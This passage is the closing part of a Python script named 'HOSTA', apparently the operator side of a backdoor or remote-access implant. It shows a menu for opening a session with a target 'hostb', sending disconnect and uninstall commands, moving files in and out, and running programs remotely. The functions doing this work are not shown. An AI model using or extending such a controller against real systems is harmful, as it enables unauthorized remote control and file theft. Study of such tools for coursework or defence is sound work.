            output_text = output_bytes.decode("utf-8", errors="replace")

        print(f"\n--- Output from hostb ({len(output_bytes)} bytes) ---")
        if output_text:
            print(output_text, end="" if output_text.endswith("\n") else "\n")
        print("--- End ---")
    finally:
        recv_socket.close()
        send_socket.close()


if __name__ == "__main__":
    print("--------------- HOSTA ---------------")
    ctx = Context()
    parse_arguments(ctx)
    handle_arguments(ctx)

    print(f"Target: {ctx.destination_ip}")

    while True:
        choice = display_menu(ctx)
        if choice == "exit":
            print("\nExiting.")
            sys.exit(0)

        if choice == "1":
            print("\nEstablishing session...")
            establish_session(ctx)
        elif choice == "2":
            print("\nSending disconnect command...")
            send_command(ctx, CMD_DISCONNECT)
        elif choice == "3":
            print("\nSending uninstall command...")
            send_command(ctx, CMD_UNINSTALL)
        elif choice == "4":
            print("\nTransferring file to hostb...")
            transfer_file(ctx)
        elif choice == "5":
            print("\nRequesting file from hostb...")
            request_file(ctx)
        elif choice == "8":
            print("\nRunning program on hostb...")
            run_program(ctx)
        elif choice in {"6", "7"}:
            print("Not implemented yet.")
        else:
            print("Invalid choice.")
